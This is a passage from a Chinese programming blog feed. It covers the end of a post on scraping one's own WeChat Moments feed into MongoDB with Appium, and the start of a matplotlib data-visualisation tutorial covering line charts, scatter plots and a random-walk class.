class="line">48</span></pre></td><td class="code"><pre><span class="line"><span class="string">        初始化</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line"><span class="string">        """</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">        <span class="comment"># 驱动配置</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">        self.desired_caps = &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">            <span class="string">'platformName'</span>: PLATFORM,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">            <span class="string">'deviceName'</span>: DEVICE_NAME,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">            <span class="string">'appPackage'</span>: APP_PACKAGE,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">            <span class="string">'appActivity'</span>: APP_ACTIVITY</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">        self.driver = webdriver.Remote(DRIVER_SERVER, self.desired_caps)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">        self.wait = WebDriverWait(self.driver, TIMEOUT)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">        self.client = MongoClient(MONGO_URL)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">        self.db = self.client[MONGO_DB]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">        self.collection = self.db[MONGO_COLLECTION]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line">        <span class="string">"""</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line"><span class="string">        登录微信</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line"><span class="string">        :return:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line"><span class="string">        """</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">        <span class="comment"># 登录按钮</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line">        print(<span class="string">'开始登陆'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">        login = self.wait.until(EC.presence_of_element_located((By.ID, <span class="string">'com.tencent.mm:id/e4g'</span>)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">        login.click()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line">        print(<span class="string">'点击登录了'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line">        <span class="comment"># 手机号</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line">        phone = self.wait.until(EC.presence_of_element_located((By.ID, <span class="string">'com.tencent.mm:id/kh'</span>)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line">        phone.set_text(USERNAME)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">76</span></pre></td><td class="code"><pre><span class="line">        <span class="comment"># 下一步</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">77</span></pre></td><td class="code"><pre><span class="line">        next = self.wait.until(EC.element_to_be_clickable((By.ID, <span class="string">'com.tencent.mm:id/axt'</span>)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">78</span></pre></td><td class="code"><pre><span class="line">        next.click()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">79</span></pre></td><td class="code"><pre><span class="line">        <span class="comment"># 密码</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">80</span></pre></td><td class="code"><pre><span class="line">        password = self.wait.until(</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">81</span></pre></td><td class="code"><pre><span class="line">            EC.presence_of_element_located((By.XPATH, <span class="string">'//*[@resource-id="com.tencent.mm:id/kh"][1]'</span>)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">82</span></pre></td><td class="code"><pre><span class="line">        password.set_text(PASSWORD)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">83</span></pre></td><td class="code"><pre><span class="line">        <span class="comment"># 提交</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">84</span></pre></td><td class="code"><pre><span class="line">        submit = self.wait.until(EC.element_to_be_clickable((By.ID, <span class="string">'com.tencent.mm:id/axt'</span>)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">85</span></pre></td><td class="code"><pre><span class="line">        submit.click()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">86</span></pre></td><td class="code"><pre><span class="line">        submit = self.wait.until(EC.element_to_be_clickable((By.ID, <span class="string">'com.tencent.mm:id/az9'</span>)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">87</span></pre></td><td class="code"><pre><span class="line">        submit.click()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">88</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">89</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enter</span><span class="params">(self)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">90</span></pre></td><td class="code"><pre><span class="line">        <span class="string">"""</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">91</span></pre></td><td class="code"><pre><span class="line"><span class="string">        进入朋友圈</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">92</span></pre></td><td class="code"><pre><span class="line"><span class="string">        :return:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">93</span></pre></td><td class="code"><pre><span class="line"><span class="string">        """</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">94</span></pre></td><td class="code"><pre><span class="line">        <span class="comment"># 点击发现</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">95</span></pre></td><td class="code"><pre><span class="line">        tab = self.wait.until(</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">96</span></pre></td><td class="code"><pre><span class="line">            EC.presence_of_element_located((By.ID, <span class="string">' '</span>)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">97</span></pre></td><td class="code"><pre><span class="line">        tab.click()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">98</span></pre></td><td class="code"><pre><span class="line">        <span class="comment"># 朋友圈</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">99</span></pre></td><td class="code"><pre><span class="line">        moments = self.wait.until(EC.presence_of_element_located((By.ID, <span class="string">' '</span>)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">100</span></pre></td><td class="code"><pre><span class="line">        moments.click()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">101</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">102</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">crawl</span><span class="params">(self)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">103</span></pre></td><td class="code"><pre><span class="line">        <span class="string">"""</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">104</span></pre></td><td class="code"><pre><span class="line"><span class="string">        爬取</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">105</span></pre></td><td class="code"><pre><span class="line"><span class="string">        :return:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">106</span></pre></td><td class="code"><pre><span class="line"><span class="string">        """</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">107</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">108</span></pre></td><td class="code"><pre><span class="line">            <span class="comment"># 当前页面显示的所有状态</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">109</span></pre></td><td class="code"><pre><span class="line">            items = self.wait.until(</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">110</span></pre></td><td class="code"><pre><span class="line">                EC.presence_of_all_elements_located(</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">111</span></pre></td><td class="code"><pre><span class="line">                    (By.XPATH, <span class="string">'//*[@resource-id="com.tencent.mm:id/avi"]//android.widget.FrameLayout'</span>)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">112</span></pre></td><td class="code"><pre><span class="line">            <span class="comment"># 上滑</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">113</span></pre></td><td class="code"><pre><span class="line">            self.driver.swipe(FLICK_START_X, FLICK_START_Y + FLICK_DISTANCE, FLICK_START_X, FLICK_START_Y)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">114</span></pre></td><td class="code"><pre><span class="line">            <span class="comment"># 遍历每条状态</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">115</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> items:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">116</span></pre></td><td class="code"><pre><span class="line">                <span class="keyword">try</span>:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">117</span></pre></td><td class="code"><pre><span class="line">                    <span class="comment"># 昵称</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">118</span></pre></td><td class="code"><pre><span class="line">                    nickname = item.find_element_by_id(<span class="string">'com.tencent.mm:id/b5o'</span>).get_attribute(<span class="string">'text'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">119</span></pre></td><td class="code"><pre><span class="line">                    <span class="comment"># 正文</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">120</span></pre></td><td class="code"><pre><span class="line">                    content = item.find_element_by_id(<span class="string">'com.tencent.mm:id/ejc'</span>).get_attribute(<span class="string">'text'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">121</span></pre></td><td class="code"><pre><span class="line">                    <span class="comment"># 获取分享的内容</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">122</span></pre></td><td class="code"><pre><span class="line">                    share = item.find_element_by_id(<span class="string">'com.tencent.mm:id/czg'</span>).get_attribute(<span class="string">'text'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">123</span></pre></td><td class="code"><pre><span class="line">                    <span class="comment">#创建存储内容</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">124</span></pre></td><td class="code"><pre><span class="line">                    data = &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">125</span></pre></td><td class="code"><pre><span class="line">                        <span class="string">'nickname'</span>: nickname,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">126</span></pre></td><td class="code"><pre><span class="line">                        <span class="string">'content'</span>: content,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">127</span></pre></td><td class="code"><pre><span class="line">                        <span class="string">'share'</span>: share,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">128</span></pre></td><td class="code"><pre><span class="line">                    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">129</span></pre></td><td class="code"><pre><span class="line">                    <span class="comment"># 插入MongoDB</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">130</span></pre></td><td class="code"><pre><span class="line">                    self.collection.update(&#123;<span class="string">'nickname'</span>: nickname, <span class="string">'content'</span>: content, <span class="string">'share'</span>: share&#125;, &#123;<span class="string">'$set'</span>: data&#125;, <span class="literal">True</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">131</span></pre></td><td class="code"><pre><span class="line">                    sleep(SCROLL_SLEEP_TIME)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">132</span></pre></td><td class="code"><pre><span class="line">                <span class="keyword">except</span> NoSuchElementException:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">133</span></pre></td><td class="code"><pre><span class="line">                    <span class="keyword">pass</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">134</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">135</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(self)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">136</span></pre></td><td class="code"><pre><span class="line">        <span class="string">"""</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">137</span></pre></td><td class="code"><pre><span class="line"><span class="string">        入口</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">138</span></pre></td><td class="code"><pre><span class="line"><span class="string">        :return:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">139</span></pre></td><td class="code"><pre><span class="line"><span class="string">        """</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">140</span></pre></td><td class="code"><pre><span class="line">        <span class="comment"># 登录</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">141</span></pre></td><td class="code"><pre><span class="line">        self.login()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">142</span></pre></td><td class="code"><pre><span class="line">        time.sleep(<span class="number">25</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">143</span></pre></td><td class="code"><pre><span class="line">        <span class="comment"># 进入朋友圈</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">144</span></pre></td><td class="code"><pre><span class="line">        self.enter()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">145</span></pre></td><td class="code"><pre><span class="line">        time.sleep(<span class="number">15</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">146</span></pre></td><td class="code"><pre><span class="line">        <span class="comment"># 爬取</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">147</span></pre></td><td class="code"><pre><span class="line">        self.crawl()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">148</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">149</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">150</span></pre></td><td class="code"><pre><span class="line">    moments = Moments()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">151</span></pre></td><td class="code"><pre><span class="line">    time.sleep(<span class="number">6</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">152</span></pre></td><td class="code"><pre><span class="line">    moments.main()</span></pre></td></tr></table></figure><p><strong>使用Mongo保存的数据，可以通过打开MongoDB Compass打开数据库查看数据</strong></p><p><img src="2.png" alt="" /></p><p>这样的话，在我的朋友圈有个微信号实时发送实习信息，爬取后可以通过数据库检索，获取所有关于实习的信息。或者其他有趣的信息。</p><blockquote><p>问题：从朋友圈中无法能够提取朋友发送朋友圈的时间信息，还需要在找资料解决。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PYTHON编程：从入门到实践之数据可视化</title>
      <link href="/archives/270bf2b5.html"/>
      <url>/archives/270bf2b5.html</url>
      
        <content type="html"><![CDATA[<h1 id="数据可视化"><a class="markdownIt-Anchor" href="#数据可视化"></a> 数据可视化</h1><blockquote><p>数据可视化是指的通过可视化来表示探索数据，与数据挖掘紧密相关，<code>数据挖掘</code>是指的使用代码来探索数据集的规律和关联。可视化的目的是为了简洁的展示给观看者数据的规律和意义。<br />本文中使用的可视化模块为matplotlib和pygal</p></blockquote><h2 id="一-准备工作"><a class="markdownIt-Anchor" href="#一-准备工作"></a> 一、准备工作</h2><h3 id="11安装matplotlib"><a class="markdownIt-Anchor" href="#11安装matplotlib"></a> 1.1安装matplotlib</h3><ul><li>linux：sudo apt-get install python3-matplotlib</li><li>windows:使用anaconda安装或者安装pip之后用pip install matplotlib</li><li>mac OS：pip install --user matplotlib</li></ul><h3 id="12测试并进行简单绘画"><a class="markdownIt-Anchor" href="#12测试并进行简单绘画"></a> 1.2测试并进行简单绘画</h3><p>可以访问http://matlplotlib.org/ 的示例画廊，来查看相应图标的的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#简单的折线图</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">squares = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">16</span>,<span class="number">25</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">plt.plot(squares)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">plt.show()</span></pre></td></tr></table></figure><p><img src="PYTHON%E7%BC%96%E7%A8%8B%EF%BC%9A%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96_1_0.png" alt="" /></p><h3 id="13修改标签文字和线条粗细"><a class="markdownIt-Anchor" href="#13修改标签文字和线条粗细"></a> 1.3修改标签文字和线条粗细</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">plt.plot(squares, linewidth=size)<span class="comment">#修改线条粗细</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">plt.title(<span class="string">'name'</span>, fontsize=n)<span class="comment">#修改图表名字</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#给坐标轴加上标签</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">plt.xlabel(<span class="string">'name'</span>, fontsize=n)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">plt.ylabel(<span class="string">'name'</span>, fontsize=n)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置刻度标记的大小</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">plt.tick_params(axis=<span class="string">'both'</span>, labelsize=<span class="number">14</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#plot函数可以同时传入自变量和因变量</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">plt.plot(x, y, linewidth=<span class="number">14</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#图标区域涂色</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#利用plt.fill_between(x,y1,y2,facecolor='red',alpha=0.1)其中alpha设置透明度0为透明，1为不透明</span></span></pre></td></tr></table></figure><h3 id="14散点图"><a class="markdownIt-Anchor" href="#14散点图"></a> 1.4散点图</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#scatter_squares.py</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">plt.scatter(<span class="number">2</span>, <span class="number">4</span>, s=<span class="number">200</span>)<span class="comment">#s可以设置散点的大小</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">plt.show()</span></pre></td></tr></table></figure><p><img src="PYTHON%E7%BC%96%E7%A8%8B%EF%BC%9A%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96_5_0.png" alt="" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#绘制系列散点</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">x=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">y=[<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">plt.scatter(x, y, c=<span class="string">'yellow'</span>, edgecolor=<span class="string">'none'</span>, s=<span class="number">100</span>)<span class="comment">#去除数据点的轮廓</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">plt.axis([<span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">11</span>])<span class="comment">#设置坐标轴范围</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">plt.show()</span></pre></td></tr></table></figure><p><img src="PYTHON%E7%BC%96%E7%A8%8B%EF%BC%9A%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96_6_0.png" alt="" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#绘制系列散点,并使用颜色映射colormap</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">x=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">y=[<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">plt.scatter(x, y, c=y, cmap=plt.cm.Blues, edgecolor=<span class="string">'none'</span>, s=<span class="number">100</span>)<span class="comment">#colormap颜色映射，看出数据的变化趋势</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">plt.axis([<span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">11</span>])<span class="comment">#设置坐标轴范围</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">plt.show()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">plt.savefig(<span class="string">'filename'</span>, bbox_inches=<span class="string">'tight'</span>)<span class="comment">#自动保存图表，第二参数是裁掉多余空白区域</span></span></pre></td></tr></table></figure><p><img src="PYTHON%E7%BC%96%E7%A8%8B%EF%BC%9A%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96_7_0.png" alt="" /></p><h3 id="15随机漫步"><a class="markdownIt-Anchor" href="#15随机漫步"></a> 1.5随机漫步</h3><p>每次行走都是随机的，意味着方向不一定，行走步数不一定。</p><h4 id="151创建randwalk类"><a class="markdownIt-Anchor" href="#151创建randwalk类"></a> 1.5.1创建RandWalk类</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RandWalk</span><span class="params">()</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    <span class="string">'''随机生成漫步数据的类'''</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, num_points=<span class="number">5000</span>)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        <span class="string">'''初始化属性'''</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        self.num_points = num_points</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        self.x_values = [<span class="number">0</span>]<span class="comment">#随机漫步从（0,0）出发</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        self.y_values = [<span class="number">0</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fill_walk</span><span class="params">(self)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        <span class="string">'''计算随机漫步的所有点'''</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">        <span class="comment">#不断漫步，直到达到指定的长度</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">while</span> len(self.x_values) &lt; self.num_points:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">            <span class="comment">#决定前进的方向和前进距离</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">            x_direction = choice([<span class="number">1</span>,<span class="number">-1</span>])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">            x_distance = choice([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">            x_step = x_direction * x_distance</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">            y_direction = choice([<span class="number">1</span>,<span class="number">-1</span>])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">            y_distance = choice([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">            y_step = y_direction * y_distance</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span 